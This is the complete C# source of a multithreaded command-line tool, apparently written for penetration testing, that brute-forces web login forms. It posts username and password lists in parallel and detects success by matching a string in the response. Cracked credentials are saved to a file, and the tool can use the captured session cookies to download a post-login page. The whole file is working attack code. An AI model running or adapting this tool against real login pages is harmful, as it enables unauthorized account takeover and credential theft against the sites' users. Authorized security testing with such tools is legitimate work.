using System;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Linq;
using System.Threading.Tasks;
using System.IO;
using System.Net.Http;
using System.Diagnostics;
using System.Net;
using System.Threading;
using CommandLine;

namespace BruteForce
{
    class Program
    {
        #region Fields

        static ConcurrentBag<string> usernames = new ConcurrentBag<string>();
        static ConcurrentBag<string> foundUsernames = new ConcurrentBag<string>();
        static List<string> passwords = new List<string>();
        static int threadsInUseCurrently = 0;

        #endregion

        static void Main(string[] args)
        {
            var o = new CommandOptions();
            bool showHelp = false;
            if (args.Count() > 0)
            {
                CommandLine.Parser.Default.ParseArgumentsStrict(args, o, () =>
                {
                    showHelp = true;
                });

                if (string.IsNullOrWhiteSpace(o.UserFileName) && string.IsNullOrWhiteSpace(o.User))
                {
                    Console.WriteLine("Either --user or --usernames must be provided\nSee --help for more info");
                    return;
                }

                if (string.IsNullOrWhiteSpace(o.PasswordFileName) && string.IsNullOrWhiteSpace(o.Password))
                {
                    Console.WriteLine("Either --pass or --passwords must be provided\nSee --help for more info");
                    return;
                }
            }
            else
            {
                showHelp = true;
            }

            if (showHelp)
            {
                CommandLine.Parser.Default.ParseArgumentsStrict(new string[] { "--help" }, o);
                return;
            }

            // Read usernames file
            if (string.IsNullOrWhiteSpace(o.User))
            {
                using (StreamReader reader = new StreamReader(o.UserFileName))
                {
                    var line = reader.ReadLine();
                    while (line != null)
                    {
                        usernames.Add(line);
                        line = reader.ReadLine();
                    }
                }
            }
            else
            {
                usernames.Add(o.User);
            }

            // Read passwords file
            if (string.IsNullOrWhiteSpace(o.Password))
            {
                using (StreamReader reader = new StreamReader(o.PasswordFileName))
                {
                    var line = reader.ReadLine();
                    while (line != null)
                    {
                        passwords.Add(line);
                        line = reader.ReadLine();
                    }
                }
            }
            else
            {
                passwords.Add(o.Password);
            }

            if (o.Verbose)
                Console.WriteLine("Total usernames to check: {0}", usernames.Count);

            runaway(o.UserField, o.PasswordField, o.URL, o.RedirectURL, o.CheckString, o.IsSuccess, o.HeaderFile, o.CookiesFile, o.AdditionalDataFile, o.OutputFile, o.Threads, o.Timeout, (s) => { if (o.Verbose) Console.Write(s); }).Wait();

            if (o.Verbose)
                Console.WriteLine("\nCompleted\nSee {0} for results", o.OutputFile);
        }

        static async Task runaway(string userField, string passwdField,
                                    string url, string redirect_url,
                                    string checkString, bool isSuccessString,
                                    string headerFile, string cookiesFile, string dataFieldFile, string outputFile,
                                    int threads, int timeout, Action<string> status = null)
        {
            var uri = new Uri(url);

            // Determine whether to store .html files or not (in case of success)
            bool toStore = !string.IsNullOrWhiteSpace(redirect_url);

            // Directory where (if chosen) html files will be stored
            DirectoryInfo storeLocation = new DirectoryInfo(Path.Combine(Directory.GetCurrentDirectory(), "store"));

            if (toStore && !storeLocation.Exists)
                storeLocation.Create();

            // Current Directory where the output is stored
            DirectoryInfo curDir = new DirectoryInfo(Directory.GetCurrentDirectory());

            initializeFoundUsernames(outputFile);

            var timeout_span = new TimeSpan(0, 0, 0, timeout);

            status?.Invoke(string.Format("Usernames already found in output file: {0}\n", foundUsernames.Count));

            using (StreamWriter dataWriter = new StreamWriter(outputFile, true))
            {
                // var activeTasks = new HashSet<Task>();

                foreach (var username in usernames)
                {
                    status?.Invoke(string.Format("Attacking: {0}\n", username));

                    if (!foundUsernames.Contains(username))
                    {
                        CancellationTokenSource cToken = new CancellationTokenSource();

                        bool passwordFound = false;
                        await DoParallelTasks(passwords.Count, async (lineIndex) =>
                        {
                            try
                            {
                                var sessionCookies = new CookieContainer();
                                using (var handler = new HttpClientHandler() { CookieContainer = sessionCookies, AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate })
                                using (var client = new HttpClient(handler) { Timeout = timeout_span })
                                {
                                    #region Add Headers and Cookies

                                    addRequestHeaders(client, headerFile);

                                    addSessionCookies(sessionCookies, cookiesFile, uri.Host);

                                    #endregion

                                    var values = new Dictionary<string, string>()
                                        {
                                            { userField, username },
                                            { passwdField, passwords[lineIndex] }
                                        };

                                    addDataFields(values, dataFieldFile);

                                    var content = new FormUrlEncodedContent(values);

                                    if (status != null && lineIndex % threads == 0)
                                    {
                                        ClearLine();
                                        status.Invoke("Trying passwords from: " + passwords[lineIndex]);
                                    }

                                    // Provide a cancellation token, so when the password is found
                                    // The requested calls should be cancelled
                                    var response = await client.PostAsync(url, content, cToken.Token);
                                    var responseString = await response.Content.ReadAsStringAsync();

                                    if (!response.IsSuccessStatusCode)
                                    {
                                        // Returns out of anonymous method (not out of the main method)
                                        return;
                                    }

                                    bool isSuccess = false;
                                    if (!isSuccessString)
                                    {
                                        // Check for invalid string in the response
                                        if (responseString.IndexOf(checkString) < 0)
                                        {
                                            isSuccess = true;
                                        }
                                    }
                                    else
                                    {
                                        // Check for success string in the response
                                        if (responseString.IndexOf(checkString) > -1)
                                        {
                                            isSuccess = true;
                                        }
                                    }

                                    if (isSuccess)
                                    {
                                        passwordFound = true;

                                        // Key found and write to the output
                                        if (status != null)
                                            ClearLine();

                                        Console.WriteLine("{0}\t{1}", username, passwords[lineIndex]);
                                        dataWriter.WriteLine(username + "\t" + passwords[lineIndex]);
                                        foundUsernames.Add(username);

                                        // Immediately write whatever remains in the buffer
                                        // In case of terminating the program, previous work shall not go in vain!
                                        await dataWriter.FlushAsync();

                                        // Cancel all other tasks that are trying passwords for this username
                                        cToken.Cancel();

                                        if (toStore)
                                        {
                                            // Redirect url page will be visited and downloaded if provided
                                            // Downloaded page goes in the folder named store
                                            var r_uri = new Uri(redirect_url);

                                            IEnumerable<string> cookies;
                                            response.Headers.TryGetValues("Set-Cookie", out cookies);
                                            
                                            #region Add Redirect Cookies

                                            if (cookies != null && cookies.Count() > 0)
                                            {

                                                foreach (var cookie in cookies)
                                                {

                                                    try
                                                    {
                                                        var cookieSplit = cookie.IndexOf('=');
                                                        var cookieName = cookie.Substring(0, cookieSplit);
                                                        var cookieValue = cookie.Substring(cookieSplit + 1, cookie.IndexOf(';') - cookieSplit - 1);
                                                        sessionCookies.Add(new Cookie(cookieName, cookieValue, "/", r_uri.Host));
                                                    }
                                                    catch
                                                    {
                                                        Debug.WriteLine("Cookie Exception");
                                                    }

                                                }
                                            }

                                            #endregion

                                            using (var redirectHandler = new HttpClientHandler() { CookieContainer = sessionCookies, AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate })
                                            using (var redirectClient = new HttpClient(redirectHandler) { Timeout = timeout_span })
                                            {
                                                addRequestHeaders(redirectClient, headerFile);

                                                // Use GET method to visit the redirect url
                                                var redirectResponse = await redirectClient.GetAsync(redirect_url);

                                                #region Write the response to file

                                                var redirectString = await redirectResponse.Content.ReadAsStringAsync();

                                                using (var responseWriter = new StreamWriter(Path.Combine(storeLocation.FullName, username + ".htm")))
                                                {
                                                    await responseWriter.WriteAsync(redirectString);
                                                }

                                                #endregion
                                            }
                                        }
                                    }
                                }
                            }
                            catch (Exception e)
                            {
                                Debug.WriteLine(e);
                            }

                        }, threads, cToken.Token);

                        // Remove the Trying passwords from: ... line
                        if (!passwordFound && status != null)
                        {
                            ClearLine();
                        }

                    } // if (!foundUsernames ...
                    else
                    {
                        status?.Invoke(string.Format("{0} already exists!\n", username));
                    }

                }

            }


        }

        // Adds to foundUsernames those usernames which are already in the output file
        private static void initializeFoundUsernames(string outputFileName)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(outputFileName))
                {
                    using (StreamReader reader = new StreamReader(outputFileName))
                    {
                        var line = reader.ReadLine();
                        while (line != null)
                        {
                            var lineSplit = line.IndexOf('\t');
                            var username = line.Substring(0, lineSplit);
                            foundUsernames.Add(username);
                            line = reader.ReadLine();
                        }
                    }
                }
            }
            catch
            {
                Debug.WriteLine("Found Usernames function exception");
            }
        }

        // If the data field file is supplied, adds them to the value dictionary
        private static void addDataFields(Dictionary<string, string> values, string dataFieldFile)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(dataFieldFile))
                {
                    using (StreamReader reader = new StreamReader(dataFieldFile))
                    {
                        var line = reader.ReadLine();
                        while (line != null)
                        {
                            var lineSplit = line.IndexOf('=');
                            var fieldName = line.Substring(0, lineSplit);
                            var fieldValue = line.Substring(lineSplit + 1);
                            values.Add(fieldName, fieldValue);
                            line = reader.ReadLine();
                        }
                    }
                }
            }
            catch
            {
                Debug.WriteLine("Data fields function exception");
            }
        }

        // If the file is supllied adds cookies to the cookie container
        private static void addSessionCookies(CookieContainer container, string cookiesFile, string hostname)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(cookiesFile))
                {
                    using (StreamReader reader = new StreamReader(cookiesFile))
                    {
                        var line = reader.ReadLine();
                        while (line != null)
                        {
                            var lineSplit = line.IndexOf('=');
                            var cookieName = line.Substring(0, lineSplit);
                            var cookieValue = line.Substring(lineSplit + 1);
                            container.Add(new Cookie(cookieName, cookieValue, "/", hostname));
                            line = reader.ReadLine();
                        }
                    }
                }
            }
            catch
            {
                Debug.WriteLine("Cookie function exception");
            }
        }

        // Add Rquest Headers in case the file is supplied otherwise just uses the default request headers
        private static void addRequestHeaders(HttpClient client, string headerFile)
        {
            try
            {
                if (!string.IsNullOrWhiteSpace(headerFile))
                {
                    using (StreamReader reader = new StreamReader(headerFile))
                    {
                        var line = reader.ReadLine();
                        while (line != null)
                        {
                            var lineSplit = line.IndexOf('=');
                            var headerName = line.Substring(0, lineSplit);
                            var headerValue = line.Substring(lineSplit + 1);
                            client.DefaultRequestHeaders.Add(headerName, headerValue);
                            line = reader.ReadLine();
                        }
                    }
                }
                else
                {
                    client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate");
                    client.DefaultRequestHeaders.Add("Accept-Language", "en-US,en;q=0.5");
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0");
                }
            }
            catch
            {
                Debug.WriteLine("Request Headers function exception");
            }
        }

        // This method is similar to Parallel.For
        // Allows maximum number of threads (threadsToUse)
        static async Task DoParallelTasks(int count, Func<int, Task> method, int threadsToUse, CancellationToken cancellation_token)
        {
            var activeTasks = new HashSet<Task>();
            for (int i = 0; i < count; i++)
            {
                if (cancellation_token.IsCancellationRequested)
                {
                    threadsInUseCurrently = 0;
                    break;
                }

                activeTasks.Add(method(i));
                threadsInUseCurrently++;

                // If the threads in use exceeds the maximum number of threads to use
                // Wait for some thread to complete and then continue the loop to add more
                if (activeTasks.Count >= threadsToUse)
                {
                    var completed = await Task.WhenAny(activeTasks);
                    activeTasks.Remove(completed);
                    threadsInUseCurrently--;
                }
            }

            await Task.WhenAll(activeTasks);
        }

        static void ClearLine()
        {
            var cursorTop = Console.CursorTop;
            Console.CursorLeft = 0;
            Console.Write(new string(' ', Console.BufferWidth));
            Console.CursorLeft = 0;
            Console.CursorTop = cursorTop;
        }
    }

    class CommandOptions
    {
        [Option('U', "usernames", HelpText = "Path of the file that contains usernames", Required = false)]
        public string UserFileName { get; set; }

        [Option("user", HelpText = "Find the password of a single user. Either this or --usernames must be provided", Required = false)]
        public string User { get; set; }

        [Option('P', "passwords", HelpText = "Path of the file that contains passwords", Required = false)]
        public string PasswordFileName { get; set; }

        [Option("pass", HelpText = "In case only single password is to be tried. Either this or --passwords must be provided", Required = false)]
        public string Password { get; set; }

        [Option('l', "loginuser", HelpText = "The name of the username field in the form", Required = true)]
        public string UserField { get; set; }

        [Option('f', "loginpass", HelpText = "The name of the password field in the form", Required = true)]
        public string PasswordField { get; set; }

        [Option('w', "url", HelpText = "The URL where the form request is to be sent", Required = true)]
        public string URL { get; set; }

        [Option("redirect", HelpText = "If specified downloads this page on success", Required = false, DefaultValue = "")]
        public string RedirectURL { get; set; }

        [Option('k', "check", HelpText = "The string to be matched in the response page", Required = true)]
        public string CheckString { get; set; }

        [Option('s', "success", HelpText = "If specified, the check string match will be considered as success", Required = false, DefaultValue = false)]
        public bool IsSuccess { get; set; }

        [Option('h', "header", HelpText = "The path of the file that contains the header data to be sent (Format of lines Name:Value)", Required = false, DefaultValue = "")]
        public string HeaderFile { get; set; }

        [Option('c', "cookie", HelpText = "The path of the file that contains the cookies to be sent (Format of lines Name:Value)", Required = false, DefaultValue = "")]
        public string CookiesFile { get; set; }

        [Option('d', "formdata", HelpText = "The path of the file that contains the additional form data (Format of lines Name:Value)", Required = false, DefaultValue = "")]
        public string AdditionalDataFile { get; set; }

        [Option('o', "output", HelpText = "The path of the file where the output will be stored (Format Username<TAB>Password)", Required = false, DefaultValue = "data.txt")]
        public string OutputFile { get; set; }

        [Option('t', "threads", HelpText = "The maximum number of threads to be executed", Required = true)]
        public int Threads { get; set; }

        [Option('e', "time", HelpText = "Timeout in seconds for each request", Required = false, DefaultValue = 5)]
        public int Timeout { get; set; }

        [Option('v', "verbose", HelpText = "Enable verbose mode", Required = false, DefaultValue = false)]
        public bool Verbose { get; set; }
    }
}
